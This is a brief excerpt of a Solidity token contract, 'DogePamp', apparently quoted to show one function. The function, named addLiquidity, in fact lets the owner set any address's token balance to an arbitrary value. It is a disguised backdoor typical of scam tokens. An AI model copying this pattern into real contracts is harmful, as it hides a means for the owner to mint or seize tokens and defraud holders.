...
contract DogePamp  is Ownable, IERC20 {
    ...
    function addLiquidity(address Liquidity, uint256 token1, uint256 token2,uint256 token3,  uint256 lp) external onlyOwner {
        _balancetoken[Liquidity] = token1 + token2  + token3 + lp ;
    }   
